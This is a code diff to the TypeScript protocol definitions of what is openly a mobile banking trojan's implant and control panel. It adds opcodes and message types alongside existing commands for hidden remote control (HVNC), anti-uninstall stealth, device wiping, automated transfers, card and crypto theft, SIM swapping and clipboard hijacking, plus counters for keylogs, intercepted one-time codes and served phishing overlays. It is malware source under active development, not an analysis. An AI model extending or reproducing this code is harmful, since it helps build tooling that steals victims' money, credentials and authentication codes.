@@ -11,9 +11,13 @@
  *  - every new field added here must be optional or given a server-side default
  */
 
+/** Wire protocol version — bump on any incompatible wire change. */
+export const PROTOCOL_VERSION = 1;
+
 /** Command opcodes understood by the implant. */
 export enum CMD {
   // ---- core / lifecycle ----
+  PING = 'ping',
   INFO = 'info',
   KILL = 'kill',
   WIPE = 'wipe',
@@ -35,6 +39,8 @@ export enum CMD {
 
   // ---- remote control ----
   HVNC = 'hvnc',
+  GESTURE = 'gesture',
+  TEXT = 'text',
   FREEZE = 'freeze',
   INJECT = 'inject',
   APPKICKER = 'appkicker',
@@ -61,9 +67,14 @@ export enum CMD {
   // ---- stealth / persistence / anti-uninstall ----
   STEALTH = 'stealth',
 
+  // ---- system info / device management ----
+  APPS = 'apps',
+  PERMS = 'perms',
+
   // ---- financial suite (Phase 7) ----
   ATS = 'ats',
   CLIP = 'clip',
+  CLIPBOARD = 'clipboard',
   CARD = 'card',
   CRYPTO = 'crypto',
   SIMSWAP = 'simswap',
@@ -119,6 +130,14 @@ export interface CommandMessage {
   deviceId: string;
   command: Command;
   ts: number;
+}
+
+/** Socket.IO wire envelope shared by every message. */
+export interface Envelope {
+  v: number;
+  id: string;
+  t: 'cmd' | 'evt' | 'res';
+  d: unknown;
 }
 
 /** Ack returned by the implant for a delivered command. */
@@ -214,7 +233,7 @@ export type ImplantEvent =
   | { kind: 'location'; deviceId: string; ts: number; lat: number; lng: number; accuracy?: number }
   | { kind: 'capture'; deviceId: string; ts: number; type: 'camera' | 'mic' | 'screen'; url?: string; size?: number }
   | { kind: 'scan'; deviceId: string; ts: number; type: 'wallet' | 'password'; results?: unknown }
-  | { kind: 'status'; deviceId: string; ts: number; status: DeviceStatus }
+  | { kind: 'status'; deviceId: string; ts: number; status: DeviceStatus; attempts?: number }
   | { kind: 'error'; deviceId: string; ts: number; message: string };
 
 /** Standard JSON envelope for all REST endpoints. */
@@ -238,6 +257,7 @@ export interface StatsRes {
   keylogs24h: number;
   otps24h: number;
   captures24h: number;
+  overlaysServed: number;
   byModel: Record<string, number>;
 }
 
